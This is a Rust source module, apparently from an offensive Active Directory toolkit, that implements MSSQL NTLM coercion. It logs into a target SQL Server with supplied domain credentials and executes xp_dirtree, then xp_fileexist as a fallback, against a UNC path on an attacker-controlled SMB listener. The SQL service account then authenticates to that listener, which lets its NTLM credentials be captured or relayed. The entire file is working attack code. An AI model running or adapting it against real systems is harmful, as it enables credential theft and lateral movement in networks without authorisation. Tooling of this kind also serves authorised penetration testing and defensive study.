//! MSSQL xp_dirtree Coercion
//!
//! Triggers an NTLM authentication attempt from a SQL Server by executing
//! `xp_dirtree` against an attacker-controlled SMB share. When the SQL
//! server process (which typically runs as `NT SERVICE\MSSQLSERVER` or a
//! domain user) enumerates a remote directory, it automatically attempts
//! NTLM authentication to the attacker's listener.

use crate::coerce::{CoerceResult, CoercionAttempt};
use crate::runner::HuntConfig;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::mssql::{MssqlClient, MssqlConfig};
use tracing::{debug, info, warn};

/// Execute xp_dirtree coercion against a MSSQL server
pub async fn run(
    config: &HuntConfig,
    target_sql_server: &str,
    listener: &str,
    listener_port: u16,
) -> Result<CoerceResult> {
    info!("=== MSSQL xp_dirtree Coercion ===");
    info!("  Target SQL: {}", target_sql_server);
    info!("  Listener:   {}:{}", listener, listener_port);

    let mut successes = Vec::new();
    let mut failures = Vec::new();

    // Build the UNC path for xp_dirtree
    let unc_path = if target_sql_server.contains(',') {
        // Named instance -- listener UNC with port
        format!("\\\\{}@{}", listener, listener_port)
    } else {
        format!("\\\\{}", listener)
    };
    info!("  UNC path: {}", unc_path);

    // Step 1: Connect to the SQL server
    let mssql_config = MssqlConfig {
        server: target_sql_server.to_string(),
        port: 1433,
        domain: Some(config.domain.clone()),
        username: Some(config.username.clone()),
        password: Some(config.secret.clone()),
        trust_cert: true,
        ..Default::default()
    };

    let mut client = match MssqlClient::connect(mssql_config).await {
        Ok(c) => {
            info!("  [+] Connected to MSSQL: {}", target_sql_server);
            c
        }
        Err(e) => {
            warn!("  [-] MSSQL connection failed: {}", e);
            return Err(OverthroneError::custom(format!(
                "Cannot connect to MSSQL server '{}': {e}",
                target_sql_server
            )));
        }
    };

    // Step 2: Attempt xp_dirtree
    // xp_dirtree(path, depth, file) -- setting depth=1, file=1
    // triggers directory enumeration which hits our SMB listener
    let sql = format!(
        "EXEC master..xp_dirtree '{}', 1, 1;",
        unc_path.replace('\'', "''")
    );
    debug!("  Executing: {}", sql);

    match client.execute(&sql).await {
        Ok(_rows) => {
            info!("  [+] xp_dirtree executed -- NTLM auth should arrive at listener");
            successes.push(CoercionAttempt {
                method: "MSSQL xp_dirtree".to_string(),
                pipe: "mssql".to_string(),
                success: true,
                error: None,
            });
        }
        Err(e) => {
            let err_str = e.to_string();
            // xp_dirtree may return an error (path not found) BUT the
            // NTLM auth attempt was still made during the directory
            // resolution -- so we treat it as likely successful
            if err_str.contains("directory") || err_str.contains("network") {
                info!("  ~ xp_dirtree returned error (likely triggered): {err_str}");
                successes.push(CoercionAttempt {
                    method: "MSSQL xp_dirtree".to_string(),
                    pipe: "mssql".to_string(),
                    success: true,
                    error: Some(format!("Directory error (likely success): {err_str}")),
                });
            } else {
                warn!("  [-] xp_dirtree failed: {err_str}");
                failures.push(CoercionAttempt {
                    method: "MSSQL xp_dirtree".to_string(),
                    pipe: "mssql".to_string(),
                    success: false,
                    error: Some(err_str),
                });
            }
        }
    }

    // Step 3: Also try xp_fileexist as alternative
    // Some hardened SQL servers disable xp_dirtree but allow xp_fileexist
    let file_sql = format!(
        "EXEC master..xp_fileexist '{}';",
        unc_path.replace('\'', "''")
    );
    debug!("  Executing fallback: {}", file_sql);

    match client.query(&file_sql).await {
        Ok(_result) => {
            if successes.iter().any(|a| a.method == "MSSQL xp_fileexist") {
                // Already counted
            } else {
                info!("  [+] xp_fileexist executed -- NTLM auth triggered");
                successes.push(CoercionAttempt {
                    method: "MSSQL xp_fileexist".to_string(),
                    pipe: "mssql".to_string(),
                    success: true,
                    error: None,
                });
            }
        }
        Err(e) => {
            let err_str = e.to_string();
            if err_str.contains("directory") || err_str.contains("network") {
                info!("  ~ xp_fileexist triggered: {err_str}");
                successes.push(CoercionAttempt {
                    method: "MSSQL xp_fileexist".to_string(),
                    pipe: "mssql".to_string(),
                    success: true,
                    error: Some(format!("Directory error (likely success): {err_str}")),
                });
            }
        }
    }

    let total_attempted = successes.len() + failures.len();
    if successes.is_empty() {
        warn!("  [-] No MSSQL coercion methods succeeded");
        info!("  Possible reasons:");
        info!("    * xp_dirtree is disabled or removed from the SQL server");
        info!("    * The SQL service account lacks network permissions");
        info!("    * The listener share is not accessible");
        info!("    * The SQL server cannot resolve the listener hostname");
    } else {
        info!(
            "  -> {}/{} coercion methods succeeded",
            successes.len(),
            total_attempted
        );
    }

    Ok(CoerceResult {
        target: target_sql_server.to_string(),
        listener: listener.to_string(),
        methods_attempted: total_attempted,
        successful_coercions: successes,
        failed_coercions: failures,
    })
}
